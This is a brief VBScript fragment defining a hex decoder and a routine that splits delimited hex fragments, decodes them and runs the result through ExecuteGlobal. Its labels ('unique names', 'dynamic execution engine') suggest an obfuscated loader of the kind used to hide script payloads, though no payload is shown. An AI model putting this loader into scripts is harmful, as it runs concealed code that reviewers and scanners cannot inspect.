'[CORE DECODER WITH UNIQUE NAMES]
Function HexDecode(sEncoded)
    Dim sOutput, i
    sOutput = ""
    For i = 1 To Len(sEncoded) Step 2
        sOutput = sOutput & Chr(CLng("&H" & Mid(sEncoded, i, 2)))
    Next
    HexDecode = sOutput
End Function

'[DYNAMIC EXECUTION ENGINE]
Sub ExecuteFragments(sFragments)
    Dim sReconstructed, sFragment
    sReconstructed = ""
    For Each sFragment In Split(sFragments,"|##|")
        sReconstructed = sReconstructed & HexDecode(sFragment)
    Next
    ExecuteGlobal sReconstructed
End Sub

